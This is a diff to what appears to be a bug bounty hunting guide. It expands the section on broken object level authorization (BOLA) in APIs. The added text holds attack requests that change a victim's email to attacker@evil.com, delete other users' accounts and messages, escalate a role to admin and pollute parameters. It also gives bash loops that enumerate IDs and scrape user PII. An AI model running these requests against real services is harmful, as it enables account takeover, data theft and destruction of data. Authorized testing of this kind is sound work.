@@ -879,7 +879,7 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.39 | ↳ [JNDI Injection](#439-jndi-injection-log4shell--ldap) | Log4Shell · LDAP · RMI · Rogue Server Setup |
 | 4.40 | ↳ [HTTP/2 Attacks](#440-http2-specific-attacks) | HPACK Bomb · Stream Abuse · H2C Smuggling |
 | 4.41 | ↳ [Dependency Confusion](#441-dependency-confusion) | Supply Chain · Private Package Hijack · npm/PyPI |
-| 4.42 | ↳ [API Security Deep Dive](#442-api-security-deep-dive) | Mass Assignment · BOLA/BFLA · Rate Limits |
+| 4.42 | ↳ [API Security Deep Dive](#442-api-security-deep-dive) | BOLA (All Methods) · Nested · UUID · Bulk · Cross-Role |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -4655,18 +4655,202 @@ POST /api/user/register
 ```
 
 **BOLA (Broken Object Level Authorization)**
+
+> BOLA = the #1 OWASP API security risk. You access another user's object by changing the ID in the URL or request body. Distinct from IDOR: BOLA is API-specific and applies to UUIDs, nested objects, and ALL HTTP methods — not just `GET`.
+
+#### **BOLA by HTTP Method**
+
 ```bash
-# Same as IDOR but specifically for API objects
-# User A's session accessing User B's resources
-GET /api/v1/users/2/profile    → 200 (as User A)
-GET /api/v1/orders/567/invoice → 200 (as User A, order owned by User B)
+# BOLA isn't just GET. Test EVERY method on the same endpoint.
 
-# Test: access your own resource, note response structure
-#       change ID to another user's, compare responses
-#       If same structure returned → BOLA confirmed
+# GET — read other user's data
+GET /api/v1/users/2/profile  (as User 1)  → 200 with User 2's data
 
-# Tip: Use two accounts, compare JWT/session, swap IDs
+# PUT — modify other user's data
+PUT /api/v1/users/2/profile  (as User 1)
+{"name":"hacked","email":"attacker@evil.com"}  → 200! Modified User 2
+
+# PATCH — partial modification of other user
+PATCH /api/v1/users/2  (as User 1)
+{"email":"attacker@evil.com"}  → 200! Changed User 2's email
+
+# DELETE — delete other user's resource
+DELETE /api/v1/users/2  (as User 1)  → 204! Deleted User 2
+
+# POST — create resource under other user
+POST /api/v1/users/2/orders  (as User 1)
+{"item":"stolen_product"}  → 201! Order created under User 2
 ```
+
+#### **Nested Resource BOLA**
+
+```bash
+# Objects related to an object ALSO need authorization checks
+# User 1 hunting BOLA:
+
+# Direct: GET /api/users/1/orders/42 → 200 (User 1's order 42)
+
+# BOLA on nested resource:
+GET /api/users/2/orders/42 → 200??  (Is this User 2's order?)
+# Even if User 1 doesn't own order 42, if User 2 owns it → BOLA
+
+# Multi-level nesting:
+GET /api/orgs/1/projects/2/tasks/3 → 200 as User from org 5
+# If User can access task 3 from org 1's project 2 → cross-org BOLA
+
+# Test systematically:
+# /api/users/{victim}/orders (all of victim's orders)
+# /api/users/{victim}/payments (all of victim's payments)
+# /api/users/{victim}/messages (read victim's messages)
+# /api/users/{victim}/settings (modify victim's settings)
+```
+
+#### **BOLA with UUID/GUID Objects**
+
+```bash
+# UUIDs aren't predictable like integers — but you can still find them
+
+# Source 1: JS files contain UUIDs of test/demo objects
+cat js_files.txt | grep -oE "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}" | sort -u
+
+# Source 2: API responses leak UUIDs of other objects
+# GET /api/users/me → response includes: {"team_id":"uuid-of-another-resource"}
+# Use that UUID to access the referenced resource
+
+# Source 3: Error messages expose UUIDs
+# GET /api/orders/0000 → "Order 0000 not found. Did you mean a1b2c3d4?"
+
+# Source 4: Create your own object → note its UUID pattern
+# Then try: increment UUIDs (v1 UUIDs are time-based → guessable!)
+```
+
+#### **BOLA in Bulk/Batch Endpoints**
+
+```bash
+# Bulk operations often skip per-object authorization
+
+# Bulk read — fetch multiple users at once
+POST /api/users/batch
+{"user_ids":[1,2,3,4,5,6,7,8,9,10]}  → returns ALL their data? BOLA.
+
+# Bulk update — modify multiple records
+POST /api/orders/bulk-update
+{"orders":[{"id":1,"status":"cancelled"},{"id":2,"status":"cancelled"}]}
+
+# Bulk delete
+POST /api/messages/bulk-delete
+{"message_ids":[101,102,103,104]}  → deletes other users' messages
+
+# GraphQL batch BOLA
+query {
+  user1: user(id:1) { email }
+  user2: user(id:2) { email }     ← BOLA!
+  user3: user(id:3) { email }     ← BOLA!
+}
+```
+
+#### **Cross-Role BOLA**
+
+```bash
+# BOLA across user roles is even more critical
+
+# Regular user → Admin objects
+GET /api/admin/users  → 403?
+GET /api/admin/users/1  → 200?? (BOLA on specific admin object!)
+# Sometimes: list is protected but individual read is NOT
+
+# User A → User B via role manipulation
+PUT /api/users/me  (as User A)
+{"role":"admin"}  → 200? Became admin? → Also report BFLA.
+
+# Multi-tenant BOLA (SaaS apps)
+# Tenant A user accessing Tenant B's data
+GET /api/tenants/B/users  → 200? Cross-tenant BOLA!
+# Organizations: GET /api/orgs/competitor/employees → 200?
+```
+
+#### **BOLA Through Parameter Pollution**
+
+```bash
+# Try passing the victim's ID through multiple channels
+
+# Query param + Body:
+POST /api/orders?user_id=2
+{"user_id": 1}  → creates order for user 2? (param pollution BOLA)
+
+# Header + Body:
+PUT /api/profile
+X-User-ID: 2
+{"user_id":1, "email":"test@test.com"}  → modifies user 2?
+
+# Cookie + Body:
+Cookie: user_id=1
+{"user_id":2, "email":"hacked@evil.com"}  → which ID wins?
+```
+
+#### **Automated BOLA Testing**
+
+```bash
+# Script: swap session cookie, test all IDs
+
+# Create two accounts: User A (attacker) and User B (victim)
+# Save cookies:
+TOKEN_A="session=userA_token_here"
+TOKEN_B="session=userB_token_here"
+
+# Get User A's IDs
+curl -s -H "Cookie: $TOKEN_A" "https://api.target.com/users/me" | jq '.id'
+# → {"id": 42, "name": "User A", "orders": [101, 102]}
+
+# Now access User A's objects with User B's cookie:
+for id in 42 101 102; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: $TOKEN_B" "https://api.target.com/api/users/$id/profile")
+  [ "$code" = "200" ] && echo "BOLA: User B can access User A's resource $id"
+done
+
+# Autorize (Burp extension) automates this:
+# → Configure: User A cookie = authenticated, User B cookie = unauthorized
+# → Autorize replays every request with User B's cookie
+# → Compares responses → flags unauthorized access
+```
+
+#### **BOLA Detection Heuristics**
+
+```bash
+# These URL patterns are BOLA candidates. Test EVERY occurrence:
+/api/*/{id}           # Direct object reference
+/api/*/{id}/*         # Nested resource
+/api/*/me             # "me" endpoints often have BOLA siblings
+/api/*/batch          # Bulk operations
+/api/*/export         # Exports may include other users' data
+
+# Request body patterns:
+{"user_id": "self"}    → try {"user_id": "victim_id"}
+{"owner": "current"}   → try {"owner": "other_user_id"}
+
+# Response patterns:
+# If response includes IDs of OTHER objects → test those IDs
+{"user":{"id":1},"reports":[{"id":50},{"id":51}]}
+# → Can you access reports 50, 51? Can you access them as User 2?
+```
+
+#### **BOLA → Critical Impact Chains**
+
+```bash
+# BOLA READ + Excessive Data Exposure = Mass PII leak
+GET /api/users/1 → {name, email, ssn, credit_card}
+for i in {1..100000}; do curl /api/users/$i; done  → 100K users PII
+
+# BOLA WRITE + Email Change = Account Takeover
+PUT /api/users/victim_id {"email":"attacker@evil.com"}
+→ Start password reset → token sent to attacker's email → ATO
+
+# BOLA DELETE + No Confirmation = Mass Destruction
+DELETE /api/users/1, DELETE /api/users/2, ...
+→ All user accounts deleted
+
+# BOLA READ + BOLA WRITE + No Rate Limit = Full Compromise
+# Read all users → find admin → change admin's email → takeover
 
 **BFLA (Broken Function Level Authorization)**
 ```bash
